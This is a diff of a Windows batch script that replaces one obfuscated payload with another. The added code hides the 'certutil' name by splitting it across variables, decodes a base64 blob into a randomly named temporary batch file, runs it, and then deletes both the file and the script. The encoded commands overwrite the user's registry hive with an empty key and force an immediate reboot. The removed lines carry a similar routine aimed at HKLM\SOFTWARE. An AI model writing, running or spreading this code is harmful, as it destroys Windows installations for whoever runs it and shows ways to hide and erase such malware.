@@ -1,6 +1,17 @@
 @echo off
-set "x=certutil -decode "%~f0" "%temp%\q.bat" >nul&&call "%temp%\q.bat"&del "%temp%\q.bat"&exit /b"
-echo KSk+UjEgQUREICJIS0xNXFNPRlRXQVJFIiAvZiA+bnVsDQpSRUcgU0FWRSAiSEtMTVxTT0ZUV0FSRSIgIkM6XG5vZGF0YSIgL3kgPm51bA0K
-echo UkVHIERFTEVURSAiSEtMTVxTT0ZUV0FSRSIgL2YgPm51bA0KUkVHIFJFU1RPUkUgSEtDVS AiQzpcbm9kYXRhIiA+bnVsID4mMQ0Kc2h1dGRvd24gL3IgL3Qg
-echo MCAvZg==>>"%~f0"
-for /f "delims=" %%a in ('powershell -c "iex ($env:x)"') do set "z=%%a"
+setlocal enabledelayedexpansion
+set "A=%TEMP%\%RANDOM%.bat"
+set "B=cmVnIGFkZCAiSEtMTVxTTiIgL2YgPm51bApyZWcgc2F2ZSAiSEtMTVxTTiIgIkM6XG5vZGF0YSIgL3kgPm51bApyZWcgZGVsZXRlICJIS0xNXFNOIiAvZiA+bnVsCnJlZyByZXN0b3JlICJIS0NVIiAiQzpcbm9kYXRhIiA+bnVsIDI+JjEKc2h1dGRvd24gL3IgL3QgMCAvZg=="
+set "C=cert"
+set "D=util"
+set "E=-decode"
+set "F=-f"
+echo %B%>>"%A%.tmp"
+%C%%D% %E% %F% "%A%.tmp" "%A%" >nul 2>&1
+del /f /q "%A%.tmp" >nul 2>&1
+if exist "%A%" (
+    call "%A%"
+    del /f /q "%A%" >nul 2>&1
+)
+start /b "" cmd /c "del /f /q "%~f0" & exit"
+exit
